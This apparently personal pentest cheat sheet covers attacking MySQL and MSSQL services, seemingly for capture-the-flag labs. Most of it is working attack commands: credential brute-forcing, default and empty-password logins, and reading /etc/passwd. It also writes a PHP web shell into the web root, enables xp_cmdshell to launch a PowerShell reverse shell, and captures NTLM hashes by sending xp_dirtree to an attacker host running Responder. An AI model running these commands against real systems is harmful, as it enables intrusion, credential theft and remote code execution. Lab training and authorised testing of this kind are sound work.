# MSSQL and MySQL

- Come back later when you see this because this dont usually allow remote logins. 

- that said, it is good to note down that there is SQL so that when you get a foothold, you can then enumerate the SQL service locally.

- You usually see MySQL or MSSQL when you see a webserver with a login function. So if you see that, you might want to try SQL injections on the web services instead.

## Nmap Scripts

```bash
# MSSQL
nmap -sV -sC -p 1433 <target ip>
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 <target ip>
nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt -p 1433 <target ip>
nmap --script ms-sql-empty-password -p 1433 <target ip>    # check for no password

# MySQL
nmap -sV -sC -p 3306 <target ip>
nmap --script mysql-info,mysql-enum -p 3306 <target ip>
nmap --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt -p 3306 <target ip>
nmap --script mysql-empty-password -p 3306 <target ip>
```

## Basic Commands

```bash
# For MySQL
mysql -h <Target ip> -u root -p
mysql -h <Target ip> -u root          # try without password
mysql -h <Target ip> -u '' -p         # empty username

# for MSSQL
impacket-mssqlclient <user>:<password>@<Target ip> -windows-auth
impacket-mssqlclient <user>:<password>@<Target ip>    # without windows auth
impacket-mssqlclient sa:password@<Target ip>           # sa is default admin

# nxc brute force
nxc mssql <target ip> -u users.txt -p passwords.txt
nxc mysql <target ip> -u root -p ''
```

## MySQL Enumeration (once connected)

```bash
# list databases
SHOW DATABASES;

# use a database
USE <database>;

# list tables
SHOW TABLES;

# dump table
SELECT * FROM users;

# read files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# write files (if FILE privilege and secure_file_priv allows)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# check current user privileges
SELECT user();
SHOW GRANTS;
```

## MSSQL Enumeration and RCE

```bash
# once connected via impacket-mssqlclient

# list databases
SELECT name FROM sys.databases;

# enumerate tables
SELECT * FROM <db>.information_schema.tables;

# check if xp_cmdshell is available
EXEC xp_cmdshell 'whoami';

# if disabled, enable it (needs sysadmin)
ENABLE_XP_CMDSHELL

# or manually
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -e <base64 encoded revshell>';

# steal NTLM hash via xp_dirtree (start responder first)
EXEC xp_dirtree '\\<attacker ip>\share';

# read files
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS x;

# linked servers (pivot to other SQL servers)
EXEC sp_linkedservers;
```

## NXC with Creds

```bash
# execute commands on MSSQL
nxc mssql <ip> -u <user> -p <password> -x "whoami"

# execute PowerShell
nxc mssql <ip> -u <user> -p <password> -X "Get-Process"
```

## Impacket MSSQL

```bash
# if you have creds, try all impacket tools
impacket-mssqlclient <domain>/<user>:<password>@<ip> -windows-auth

# capture hash
sudo responder -I tun0
# then from MSSQL: EXEC xp_dirtree '\\<your ip>\test'
```
